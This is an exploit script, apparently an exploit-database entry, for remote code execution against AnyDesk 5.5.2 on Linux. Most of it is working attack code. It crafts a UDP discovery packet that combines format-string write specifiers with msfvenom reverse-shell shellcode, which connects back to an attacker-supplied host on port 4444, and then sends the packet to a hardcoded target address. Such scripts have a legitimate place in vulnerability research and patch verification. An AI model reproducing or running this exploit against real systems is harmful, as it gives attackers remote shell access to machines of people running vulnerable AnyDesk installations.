# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.22.213'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xfa\x9c\x1b"
shellcode += b"\xa6\xcd\x0a\xc6\x7c\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x90\xb5\x43\x3f\xa7"
shellcode += b"\x08\x99\x16\xfb\xc2\x14\xa3\x85\x9d\x8e\xc5"
shellcode += b"\xf8\x9c\x0a\xfa\xc7\x07\xc1\x2a\xab\xd4\x92"
shellcode += b"\x40\xa7\x1a\x9c\x16\xd0\xc4\x14\xa3\xa7\x09"
shellcode += b"\x98\x34\x05\x52\x71\x87\x95\x05\xc3\x09\x0c"
shellcode += b"\xf6\x20\xfe\x54\x42\x7d\x53\x98\xf5\x75\x89"
shellcode += b"\xbe\x62\xc6\x2f\xb2\x15\xfc\xf4\x9a\x42\x4f"
shellcode += b"\x9a\xf5\x99\x1b\xa6\xcd\x0a\xc6\x7c"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')